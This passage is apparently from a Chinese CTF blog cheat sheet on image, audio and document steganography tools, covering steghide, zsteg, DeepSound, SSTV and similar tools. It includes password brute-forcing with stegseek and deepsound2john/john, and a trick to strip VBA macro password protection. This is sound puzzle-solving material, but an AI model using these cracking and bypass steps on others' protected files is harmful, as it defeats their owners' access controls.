<h2 id="0x05-steghide-可需要passwd"><a href="#0x05-steghide-可需要passwd" class="headerlink" title="0x05 steghide(可需要passwd)"></a>0x05 steghide(可需要passwd)</h2><p><code>steghide</code>可以将数据隐藏在图像和音频文件中</p>
<p>加密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//将secret.txt文件隐藏到text.jpg中<br>steghide embed -cf test.jpg -ef secret.txt -p 123456<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">steghide extract -sf out.jpg -p 123456<br></code></pre></td></tr></table></figure>

<p>有些题目需要爆破steghide的密码，可以使用pyhton脚本或<a href="https://github.com/RickdeJager/stegseek">stegseek</a>工具</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//不指定wordlist.txt时自动使用`rockyou.txt`（如果系统中有，没有会报错）<br>stegseek [stegofile.jpg] [wordlist.txt]<br></code></pre></td></tr></table></figure>

<h2 id="0x06-F5-steganography-需要passwd"><a href="#0x06-F5-steganography-需要passwd" class="headerlink" title="0x06 F5-steganography(需要passwd)"></a>0x06 F5-steganography(需要passwd)</h2><p>F5隐写可以将文件嵌入到BMP、GIF或JPEG图像中，需要java环境</p>
<p>加密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">java Embed 原图.jpg 生成图.jpg -e 隐藏的文件.txt -p &#x27;密码&#x27;<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">java Extract out.jpg -p &#x27;密码&#x27;<br></code></pre></td></tr></table></figure>

<p>特征</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/F5.png"></p>
<h2 id="0x07-zsteg"><a href="#0x07-zsteg" class="headerlink" title="0x07 zsteg"></a>0x07 zsteg</h2><p>lsb隐写，与steghide类似，可以检测PNG和BMP中的隐藏数据隐藏数据，可以快速提取隐藏信息。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">zsteg -a &lt;文件名&gt;<br>zsteg -e b8,a,lsb,xy 文件.png -&gt; out.png<br></code></pre></td></tr></table></figure>

<h2 id="0x07-outguess-可需要passwd"><a href="#0x07-outguess-可需要passwd" class="headerlink" title="0x07 outguess(可需要passwd)"></a>0x07 outguess(可需要passwd)</h2><p>加密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">outguess -k &#x27;密码&#x27; -d &lt;需要隐藏的内容&gt; 1.jpg 2.jpg<br>//1.jpg会覆盖2.jpg<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">outguess -k &#x27;密码&#x27; -r &lt;加密的图片&gt;  -t &lt;输出保存的文件&gt;<br></code></pre></td></tr></table></figure>

<h2 id="0x08-盲水印"><a href="#0x08-盲水印" class="headerlink" title="0x08 盲水印"></a>0x08 盲水印</h2><p>水印又分为单图水印和双图水印</p>
<p>单图水印是指只需要一张图片就能提取出隐藏的信息，双图需要两张图片（一般是原图和加密后的图片，通常两张图片看上去是一样的）</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//blindwatermark双图盲水印<br>python2 bwm.py encode 原图.png 水印图.png 有盲水印的图.png<br>python2 bwm.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png<br>python3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png<br>python3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png --oldseed<br></code></pre></td></tr></table></figure>


<p>还有一种特殊的盲水印：<code>频域盲水印</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><br>ALPHA = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_parser</span>():<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;--original&#x27;</span>, dest=<span class="hljs-string">&#x27;ori&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--image&#x27;</span>, dest=<span class="hljs-string">&#x27;img&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--result&#x27;</span>, dest=<span class="hljs-string">&#x27;res&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--alpha&#x27;</span>, dest=<span class="hljs-string">&#x27;alpha&#x27;</span>, default=ALPHA)<br>    <span class="hljs-keyword">return</span> parser<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = build_parser()<br>    options = parser.parse_args()<br>    ori = options.ori<br>    img = options.img<br>    res = options.res<br>    alpha = options.alpha<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(ori):<br>        parser.error(<span class="hljs-string">&quot;original image %s does not exist.&quot;</span> % ori)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(img):<br>        parser.error(<span class="hljs-string">&quot;image %s does not exist.&quot;</span> % img)<br>    decode(ori, img, res, alpha)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">ori_path, img_path, res_path, alpha</span>):<br>    ori = cv2.imread(ori_path)<br>    img = cv2.imread(img_path)<br>    ori_f = np.fft.fft2(ori)<br>    img_f = np.fft.fft2(img)<br>    height, width = ori.shape[<span class="hljs-number">0</span>], ori.shape[<span class="hljs-number">1</span>]<br>    watermark = (ori_f - img_f) / alpha<br>    watermark = np.real(watermark)<br>    res = np.zeros(watermark.shape)<br>    random.seed(height + width)<br>    x = <span class="hljs-built_in">range</span>(height / <span class="hljs-number">2</span>)<br>    y = <span class="hljs-built_in">range</span>(width)<br>    random.shuffle(x)<br>    random.shuffle(y)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height / <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            res[x[i]][y[j]] = watermark[i][j]<br>    cv2.imwrite(res_path, res, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="hljs-number">100</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>使用<br><code>python pinyubwm.py --original 1.png --image 2.png --result out.png</code></p>
<h2 id="0x09-gnuplot"><a href="#0x09-gnuplot" class="headerlink" title="0x09 gnuplot"></a>0x09 gnuplot</h2><p><code>gnuplot</code>可以把坐标画出来</p>
<p>坐标格式：<code>number number</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">plot &quot;1.txt&quot;<br></code></pre></td></tr></table></figure>


<h2 id="0x10-拼图"><a href="#0x10-拼图" class="headerlink" title="0x10 拼图"></a>0x10 拼图</h2><p><code>montage+gaps</code>可以将小图片还原成大图片</p>
<p>先用<code>montage</code>组合图片</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">montage input_file -tile 8X6 -geometry +0+0 output_file<br></code></pre></td></tr></table></figure>

<p><code>input_file</code>：可以一张一张指定，也能使用正则匹配(<code>*.png</code>)<br><code>-geometry +0+0</code>：使图片之间没有间隙<br><code>-tile 8X6</code>：以8行6列排列<br><code>output_file</code>：输出文件</p>
<p><code>gaps</code>用来还原<code>montage</code>命令创建的乱序图像</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">gaps --image=out.jpg --generations=50 --population=120 --size=50<br><br>--image            指向拼图的路径<br>--size            拼图块的像素尺寸（如果不能明确提供--size的参数，拼图块尺寸将自适应调整）<br>--generations    遗传算法的代的数量<br>--population    个体数量<br>--verbose        每一代训练结束后展示最佳结果<br>--save            将拼图还原为图像<br></code></pre></td></tr></table></figure>

<p><code>montage+gaps</code>适用于大小相同，数量小的拼图。复杂的需要注意图片名或其他地方是否有顺序提示，还可以注意图片中的冗余位是否可能包含坐标数据</p>
<h2 id="0x11-pngcheck"><a href="#0x11-pngcheck" class="headerlink" title="0x11 pngcheck"></a>0x11 pngcheck</h2><p>windows工具，用来检查IDAT块</p>
<h2 id="0x12-webp"><a href="#0x12-webp" class="headerlink" title="0x12 webp"></a>0x12 webp</h2><blockquote>
<p>webp图片是一种同时提供了有损压缩与无损压缩（可逆压缩）的图片文件格式。webp最初在2010年发布，目标是减少文件大小，但达到和JPEG格式相同的图片质量，希望能够减少图片在网络上的发送时间。</p>
</blockquote>
<p><a href="https://developers.google.com/speed/webp/docs/using?hl=zh-cn">webp工具官方文档</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">cwebp - 将图片文件压缩为 WebP 文件<br>cwebp 1.png -o 2.webp<br><br>dwebp - 将 WebP 文件解压缩到图片文件<br>dwebp 1.webp -o 2.png<br><br>gif2webp - 将 GIF 图片转换为 WebP 格式<br>gif2webp 1.gif -o 2.webp<br><br>vwebp - 解压缩 WebP 文件，然后在窗口中显示该文件<br>vwebp 1.webp<br><br>webpinfo - 输出 WebP 文件的区块级结构以及基本完整性检查<br>webpinfo 1.webp<br></code></pre></td></tr></table></figure>

<h2 id="0x13-stegpy-可需要passwd"><a href="#0x13-stegpy-可需要passwd" class="headerlink" title="0x13 stegpy(可需要passwd)"></a>0x13 stegpy(可需要passwd)</h2><p>加密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">stegpy &#x27;hello_world&#x27; image.png<br>stegpy &quot;hello_world&quot; image.png -p   //需要密码<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">stegpy _image.png<br>stegpy _image.png -p  //需要密码<br></code></pre></td></tr></table></figure>

<h2 id="0x14-二维码"><a href="#0x14-二维码" class="headerlink" title="0x14 二维码"></a>0x14 二维码</h2><p>二维码类的题目需要对二维码的生成原理有深入了解</p>
<p><a href="https://li-yang.cn/?p=627">CTF中二维码题目及答题技巧总结（一）</a></p>
<p>可能有以下考点</p>
<p>1：修复二维码</p>
<p>可能给了一张常规的二维码，但是没有定位符，就需要自己画上去，或者一个大二维码打乱成数个小的二维码，需要还原</p>
<p>2：与数织结合</p>
<p>例如祥云杯的<code>shuffle_code</code></p>
<p>3：奇奇怪怪的变种二维码</p>
<p>推荐<code>cortexScan</code>和中国编码识别</p>
<h1 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h1><h2 id="0x01-MP3stego-需要passwd"><a href="#0x01-MP3stego-需要passwd" class="headerlink" title="0x01 MP3stego(需要passwd)"></a>0x01 MP3stego(需要passwd)</h2><p>针对<code>.mp3</code>文件隐写</p>
<p><code>.\Decode.exe -X -P [password] [stego_mp3]</code></p>
<p>会在当前目录下生成一个txt文件</p>
<h2 id="0x02-steghide-可需要passwd"><a href="#0x02-steghide-可需要passwd" class="headerlink" title="0x02 steghide(可需要passwd)"></a>0x02 steghide(可需要passwd)</h2><p>上面提到过的steghide，也能用于音频隐写</p>
<h2 id="0x03-Audacity"><a href="#0x03-Audacity" class="headerlink" title="0x03 Audacity"></a>0x03 Audacity</h2><p>神器</p>
<p>1.摩斯密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/yinpin-1.png"></p>
<p>2.频谱图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/yinpin-2.png"></p>
<p>3.反向音频</p>
<p>4.波形</p>
<h2 id="0x04-minimodem"><a href="#0x04-minimodem" class="headerlink" title="0x04 minimodem"></a>0x04 minimodem</h2><p>分析wav文件</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">minimodem --rx -f encoded.wav 1200<br></code></pre></td></tr></table></figure>

<p><code>--rx</code>：rx或者r均可，为指定读取模式<br><code>-f</code>：读取文件<br><code>1200</code>：为bell202 bps对应参数</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//baudmode参考<br>&#123;any floating point value N&#125; : Bell202-style at N bps −−ascii<br><br>1200 : Bell202 1200 bps −−ascii<br><br>300 : Bell103 300 bps −−ascii<br><br>rtty : RTTY 45.45 bps −−baudot −−stopbits 1.5<br><br>tdd : TTY/TDD 45.45 bps −−baudot −−stopbits 2.0<br><br>same : SAME 520.83 bps −−startbits 0 −−stopbits 0 −−sync-byte 0xAB NOAA Specific Area Message Encoding (SAME) protocol<br><br>callerid : Bell202 1200 bps Caller-ID (MDMF or SDMF) protocol<br><br>uic-train : UIC-751-3 600 bps train-to-ground message protocol<br><br>uic-ground : UIC-751-3 600 bps ground-to-train message protocol<br></code></pre></td></tr></table></figure>

<p><a href="http://www.whence.com/minimodem/minimodem.1.html">官方手册</a></p>
<h2 id="0x05-DeepSound-需要passwd"><a href="#0x05-DeepSound-需要passwd" class="headerlink" title="0x05 DeepSound(需要passwd)"></a>0x05 DeepSound(需要passwd)</h2><p>windows软件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/DeepSound.jpg"></p>
<p>部分题目的密码需要用<a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py">deepsound2john.py</a>爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">deepsound2john extracts password hashes from audio files containing encrypted</span><br><span class="hljs-string">data steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).</span><br><span class="hljs-string"></span><br><span class="hljs-string">This method is known to work with files created by DeepSound 2.0.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Input files should be in .wav format. Hashes can be recovered from audio files</span><br><span class="hljs-string">even after conversion from other formats, e.g.,</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ffmpeg -i input output.wav</span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    python3 deepsound2john.py carrier.wav &gt; hashes.txt</span><br><span class="hljs-string">    john hashes.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">This software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, and</span><br><span class="hljs-string">it is hereby released to the general public under the following terms:</span><br><span class="hljs-string">Redistribution and use in source and binary forms, with or without</span><br><span class="hljs-string">modification, are permitted.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> textwrap<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_low</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[::<span class="hljs-number">2</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_normal</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">4</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span> | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">15</span>))<br>  <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_high</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">8</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>     | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span> \<br>             | (buf[i + <span class="hljs-number">4</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span> | (buf[i + <span class="hljs-number">6</span>] &amp; <span class="hljs-number">3</span>))<br>  <span class="hljs-keyword">return</span> out<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_magic</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-comment"># This is a more efficient way of testing for the `DSCF` magic header without</span><br>  <span class="hljs-comment"># decoding the whole buffer</span><br>  <span class="hljs-keyword">return</span> (buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">68</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">2</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">68</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">83</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">6</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">83</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">67</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">67</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">14</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &amp; <span class="hljs-number">15</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_wave</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;RIFF&#x27;</span> <span class="hljs-keyword">and</span> buf[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>] == <span class="hljs-string">b&#x27;WAVE&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_deepsound_file</span>(<span class="hljs-params">f</span>):<br>  bname = os.path.basename(f.name)<br>  logger = logging.getLogger(bname)<br><br>  <span class="hljs-comment"># Check if it&#x27;s a .wav file</span><br>  buf = f.read(<span class="hljs-number">12</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_wave(buf):<br>    <span class="hljs-keyword">global</span> convert_warn<br>    logger.error(<span class="hljs-string">&#x27;file not in .wav format&#x27;</span>)<br>    convert_warn = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span><br>  f.seek(<span class="hljs-number">0</span>, os.SEEK_SET)<br><br>  <span class="hljs-comment"># Scan for the marker...</span><br>  hdrsz = <span class="hljs-number">104</span><br>  hdr = <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    off = f.tell()<br>    buf = f.read(hdrsz)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf) &lt; hdrsz: <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> is_magic(buf):<br>          hdr = decode_data_normal(buf)<br>          logger.info(<span class="hljs-string">&#x27;found DeepSound header at offset %i&#x27;</span>, off)<br>          <span class="hljs-keyword">break</span><br><br>    f.seek(-hdrsz + <span class="hljs-number">1</span>, os.SEEK_CUR)<br><br>  <span class="hljs-keyword">if</span> hdr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    logger.warn(<span class="hljs-string">&#x27;does not appear to be a DeepSound file&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br><br>  <span class="hljs-comment"># Check some header fields</span><br>  mode = hdr[<span class="hljs-number">4</span>]<br>  encrypted = hdr[<span class="hljs-number">5</span>]<br><br>  modes = &#123;<span class="hljs-number">2</span>: <span class="hljs-string">&#x27;low&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;normal&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;high&#x27;</span>&#125;<br>  <span class="hljs-keyword">if</span> mode <span class="hljs-keyword">in</span> modes:<br>    logger.info(<span class="hljs-string">&#x27;data is encoded in %s-quality mode&#x27;</span>, modes[mode])<br>  <span class="hljs-keyword">else</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected data encoding mode %i&#x27;</span>, modes[mode])<br>    <span class="hljs-keyword">return</span><br><br>  <span class="hljs-keyword">if</span> encrypted == <span class="hljs-number">0</span>:<br>    logger.warn(<span class="hljs-string">&#x27;file is not encrypted&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br>  <span class="hljs-keyword">elif</span> encrypted != <span class="hljs-number">1</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected encryption flag %i&#x27;</span>, encrypted)<br>    <span class="hljs-keyword">return</span><br><br>  sha1 = hdr[<span class="hljs-number">6</span>:<span class="hljs-number">6</span>+<span class="hljs-number">20</span>]<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s:$dynamic_1529$%s&#x27;</span> % (bname, sha1.<span class="hljs-built_in">hex</span>()))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  <span class="hljs-keyword">import</span> argparse<br><br>  parser = argparse.ArgumentParser()<br>  parser.add_argument(<span class="hljs-string">&#x27;--verbose&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>  parser.add_argument(<span class="hljs-string">&#x27;files&#x27;</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, metavar=<span class="hljs-string">&#x27;file&#x27;</span>,<br>    <span class="hljs-built_in">type</span>=argparse.FileType(<span class="hljs-string">&#x27;rb&#x27;</span>, bufsize=<span class="hljs-number">4096</span>))<br>  args = parser.parse_args()<br><br>  <span class="hljs-keyword">if</span> args.verbose:<br>    logging.basicConfig(level=logging.INFO)<br>  <span class="hljs-keyword">else</span>:<br>    logging.basicConfig(level=logging.WARN)<br><br>  convert_warn = <span class="hljs-literal">False</span><br><br>  <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> args.files:<br>    process_deepsound_file(f)<br><br>  <span class="hljs-keyword">if</span> convert_warn:<br>    <span class="hljs-built_in">print</span>(textwrap.dedent(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    Some files were not in .wav format. Try converting them to .wav</span><br><span class="hljs-string">    and try again. You can use: ffmpeg -i input output.wav</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.rstrip()), file=sys.stderr)<br></code></pre></td></tr></table></figure>

<p>用法</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">python3 deepsound2john.py carrier.wav &gt; hashes.txt<br>john hashes.txt<br></code></pre></td></tr></table></figure>

<h2 id="0x06-dtmf"><a href="#0x06-dtmf" class="headerlink" title="0x06 dtmf"></a>0x06 dtmf</h2><blockquote>
<p>双音多频信号（Dual-Tone Multi-Frequency, DTMF），电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。<br>双音多频的拨号键盘是4×4的矩阵，每一行代表一个高频，每一列代表一个低频。每按一个键就发送一个高频和低频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。<br>（来自维基百科）</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/dtmf.jpg"></p>
<p>命令识别：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">dtmf2num xxx.wav<br></code></pre></td></tr></table></figure>


<h2 id="0x07-SSTV"><a href="#0x07-SSTV" class="headerlink" title="0x07 SSTV"></a>0x07 SSTV</h2><p>慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片</p>
<p>可以通过<code>Robot36</code>app或者<a href="https://github.com/colaclanth/sstv">SSTV Decoder</a>识别</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">sstv -d audio_file.wav -o result.png<br></code></pre></td></tr></table></figure>

<h2 id="0x08-openpuff-需要passwd"><a href="#0x08-openpuff-需要passwd" class="headerlink" title="0x08 openpuff(需要passwd)"></a>0x08 openpuff(需要passwd)</h2><p>windows软件</p>
<p>需要三个8位密码解密</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/openpuff.png"></p>
<h1 id="文档隐写"><a href="#文档隐写" class="headerlink" title="文档隐写"></a>文档隐写</h1><h2 id="0x01-VBA宏密码破解"><a href="#0x01-VBA宏密码破解" class="headerlink" title="0x01 VBA宏密码破解"></a>0x01 VBA宏密码破解</h2><p>将<code>CMG=</code>替换为<code>CMG.</code>，<code>DPB=</code>替换为<code>DPB.</code> ，<code>GC=</code>替换为<code>GC.</code></p>
<p><code>alt+F11</code>打开vba编辑器</p>
<h2 id="0x02-字体隐藏"><a href="#0x02-字体隐藏" class="headerlink" title="0x02 字体隐藏"></a>0x02 字体隐藏</h2><p>在字体的效果中勾选隐藏选项即可隐藏字符(或者采用了白色字体)</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/word-1.png"></p>
<h2 id="0x03-图片隐藏"><a href="#0x03-图片隐藏" class="headerlink" title="0x03 图片隐藏"></a>0x03 图片隐藏</h2><p>把后缀改为<code>zip</code>解压，在<code>media</code>目录下可以看到文档的所有图片(不排除故意放在其他目录中)</p>
<h2 id="0x04-pdf文件"><a href="#0x04-pdf文件" class="headerlink" title="0x04 pdf文件"></a>0x04 pdf文件</h2><p>使用福昕编辑器等即可编辑，或者先转换成<code>docx</code></p>
<h2 id="0x05-wbstego4"><a href="#0x05-wbstego4" class="headerlink" title="0x05 wbstego4"></a>0x05 wbstego4</h2><p>适用于pdf隐写</p>
<h2 id="0x06-密码爆破"><a href="#0x06-密码爆破" class="headerlink" title="0x06 密码爆破"></a>0x06 密码爆破</h2><p>可以用<code>passware kit</code>等工具爆破</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/word-2.png"></p>
<h2 id="0x07-odttf转ttf"><a href="#0x07-odttf转ttf" class="headerlink" title="0x07 odttf转ttf"></a>0x07 odttf转ttf</h2><p>当复制文档中的内容至notepad后与原内容不一样，多半是修改了字体</p>
<p><a href="https://somanchiu.github.io/odttf2ttf/js/demo">在线网站转换</a></p>
<p>python转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font2.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure>

<p>转换前先修改<code>xxx.odttf</code>文件名为对应的<code>fontKey</code>值(&#x2F;word&#x2F;fontTable.xml)</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/odttf.png"></p>
<p><a href="https://fontdrop.info/#/?darkmode=true">FontDrop</a>或fontforge识别ttf即可</p>
